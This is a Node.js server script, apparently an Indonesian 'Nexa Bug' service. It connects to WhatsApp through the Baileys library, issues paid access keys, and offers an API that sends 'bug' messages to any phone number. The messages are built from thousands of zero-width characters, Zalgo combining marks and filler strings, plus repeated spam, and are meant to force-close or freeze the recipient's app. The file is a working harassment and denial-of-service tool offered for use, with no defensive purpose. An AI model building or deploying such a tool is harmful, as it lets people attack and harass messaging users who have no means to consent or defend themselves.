const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const Pino = require('pino');
const fs = require('fs');
const path = require('path');
const cron = require('node-cron');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const KEYS_DB = path.join(__dirname, 'keys.db');
const SESSION_DIR = path.join(__dirname, 'sessions');
const AUTH_FOLDER = path.join(SESSION_DIR, 'auth_baileys');

if (!fs.existsSync(KEYS_DB)) fs.writeFileSync(KEYS_DB, JSON.stringify({ keys: {}, users: {} }));
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

const keyDB = JSON.parse(fs.readFileSync(KEYS_DB));
function saveKeys() { fs.writeFileSync(KEYS_DB, JSON.stringify(keyDB, null, 2)); }
function generateKey(duration) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = 'NEXA-';
  for (let i=0;i<12;i++) code += chars[Math.floor(Math.random()*chars.length)];
  const now = Date.now();
  let expiry = now + (duration==='day'?86400000:duration==='month'?2592000000:31536000000);
  keyDB.keys[code] = { expiry, used: false, duration };
  saveKeys();
  return code;
}
function validateKey(code) {
  const key = keyDB.keys[code];
  if (!key || key.used || Date.now() > key.expiry) return false;
  return true;
}
function useKey(code) {
  if (validateKey(code)) { keyDB.keys[code].used = true; saveKeys(); return true; }
  return false;
}

let sock = null, pairingCode = null, isConnected = false, pairNumber = null;

async function connectToWhatsApp(number) {
  console.log(`📱 Menghubungkan ke WA dengan pairing code untuk ${number}...`);
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
  const logger = Pino({ level: 'silent' });
  sock = makeWASocket({
    logger,
    auth: state,
    printQRInTerminal: false,
    syncFullHistory: false,
    browser: ['Nexa Bug', 'Chrome', '120.0.0.0'],
  });
  sock.ev.on('creds.update', saveCreds);
  if (number && !sock.authState.creds.registered) {
    setTimeout(async () => {
      try {
        const code = await sock.requestPairingCode(number);
        pairingCode = code;
        console.log(`\n🔑 PAIRING CODE: ${code}\n`);
      } catch (err) { console.error('❌ Gagal request pairing code:', err); }
    }, 1000);
  }
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
      isConnected = false;
      if (shouldReconnect) connectToWhatsApp(number);
      else console.log('❌ Logout, hubungkan ulang');
    } else if (connection === 'open') {
      isConnected = true;
      console.log('✅ WhatsApp terhubung!');
    }
  });
  sock.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.key.fromMe && !msg.key.remoteJid?.endsWith('@g.us')) {
      const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
      if (text.toLowerCase() === 'hi') {
        await sock.sendMessage(msg.key.remoteJid, { text: '👋 Hai! Bot Nexa Bug aktif.' });
      }
    }
  });
  return sock;
}

app.get('/api/pairing', (req, res) => {
  if (pairingCode) res.json({ pairingCode });
  else res.status(404).json({ error: 'Pairing code not ready' });
});
app.post('/api/connect', async (req, res) => {
  const { number } = req.body;
  if (!number) return res.status(400).json({ error: 'Number required' });
  try {
    pairNumber = number;
    await connectToWhatsApp(number);
    res.json({ success: true, message: 'Connecting... check pairing code' });
  } catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/status', (req, res) => {
  res.json({ connected: isConnected, pairingCode, number: pairNumber });
});
app.post('/api/generate-key', (req, res) => {
  const { duration } = req.body;
  if (!['day','month','permanent'].includes(duration)) return res.status(400).json({ error: 'Invalid duration' });
  const key = generateKey(duration);
  res.json({ key, duration });
});
app.post('/api/validate-key', (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ error: 'Key required' });
  res.json({ valid: validateKey(key) });
});
app.post('/api/use-key', (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ error: 'Key required' });
  if (useKey(key)) res.json({ success: true });
  else res.status(400).json({ error: 'Invalid or expired key' });
});

function generateZeroWidth(c) { let s=''; for(let i=0;i<c;i++) s+='\u200B'; return s; }
function generateZalgo(c) { let s=''; for(let i=0;i<c;i++) s+='a\u0300\u0301\u0302\u0303'; return s; }
function generateOverflow() { let s=''; for(let i=0;i<5000;i++) s+='ZGF0YTo='; return s; }

app.post('/api/send-bug', async (req, res) => {
  const { target, bugType, key } = req.body;
  if (!target || !bugType || !key) return res.status(400).json({ error: 'Missing fields' });
  if (!validateKey(key)) return res.status(401).json({ error: 'Invalid or expired key' });
  if (!sock || !isConnected) return res.status(503).json({ error: 'WhatsApp not connected' });

  let payload = '';
  switch (bugType) {
    case 'forclose_invisible': payload = generateZeroWidth(5000); break;
    case 'forclose_hard': payload = generateZalgo(2000); break;
    case 'forclose_delay': payload = generateZeroWidth(6000)+generateZalgo(1000); break;
    case 'invisible_delay': payload = generateZeroWidth(7000); break;
    case 'hard_delay': payload = generateZalgo(3000)+generateOverflow(); break;
    case 'onehit': let s=''; for(let i=0;i<10000;i++) s+='\u200B'; s+=generateZalgo(500); payload=s; break;
    case 'spam_call': payload = '📞 SPAM CALL'; break;
    case 'spam_pair': payload = generateZeroWidth(3000)+generateZalgo(500); break;
    default: return res.status(400).json({ error: 'Invalid bug type' });
  }
  try {
    let jid = target + '@s.whatsapp.net';
    if (bugType === 'spam_call') {
      for (let i=0;i<5;i++) await sock.sendMessage(jid, { text: `📞 SPAM CALL #${i+1}` });
    } else {
      await sock.sendMessage(jid, { text: payload });
    }
    res.json({ success: true, message: `Bug ${bugType} sent to ${target}` });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send: '+err.message });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 API server running on port ${PORT}`);
});
cron.schedule('0 */6 * * *', () => {
  if (!isConnected && pairNumber) connectToWhatsApp(pairNumber);
});
